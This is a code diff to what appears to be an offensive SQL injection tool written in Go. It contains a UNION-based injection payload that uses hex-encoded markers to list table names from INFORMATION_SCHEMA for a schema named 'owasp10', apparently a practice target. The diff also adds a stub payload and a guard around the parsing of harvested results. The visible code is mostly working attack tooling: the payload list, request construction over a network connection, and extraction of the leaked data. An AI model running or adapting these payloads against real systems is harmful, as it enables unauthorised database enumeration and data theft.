@@ -13,6 +13,7 @@ import (
 
 var payloads = []string{
 	"e' UNION ALL SELECT NULL,CONCAT(0x717a7a7671,IFNULL(CAST(table_name AS NCHAR),0x20),0x7170706271),NULL,NULL,NULL FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x6f776173703130)-- -",
+	"e' ",
 }
 
 var HexFirst = "0x717a7a7671"
@@ -50,7 +51,6 @@ func NewQuery(cType, path, host, body string) string {
 
 func hexToString(str string) (string, error) {
 	if strings.HasPrefix(str, "0x") || strings.HasPrefix(str, "0X") {
-
 		fmt.Println(str, str[2:])
 		str = str[2:]
 	}
@@ -87,8 +87,11 @@ func process(conn *net.Conn, req string) (string, error) {
 	formattedRes := patern.FindAllStringSubmatch(string(response), -1)
 
 	var gatheredString []string
-	for _, res := range formattedRes {
-		gatheredString = append(gatheredString, res[1])
+
+	if len(formattedRes) > 0 {
+		for _, res := range formattedRes {
+			gatheredString = append(gatheredString, res[1])
+		}
 	}
 
 	str := strings.Join(gatheredString, "\n")
